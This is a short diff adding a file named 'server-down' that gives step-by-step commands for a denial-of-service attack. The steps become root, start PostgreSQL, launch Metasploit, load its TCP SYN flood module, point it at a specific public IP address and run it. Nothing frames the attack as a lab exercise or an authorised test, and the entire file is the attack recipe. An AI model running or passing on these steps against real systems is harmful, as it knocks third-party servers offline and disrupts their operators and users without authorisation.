@@ -1,0 +1,10 @@
+# server-down
+1-sudo su 
+service postgresql start
+service postgresql status
+msfconsole
+ use auxiliary/dos/tcp/synflood
+show options
+set RHOSTS 51.89.153.93
+show options
+run
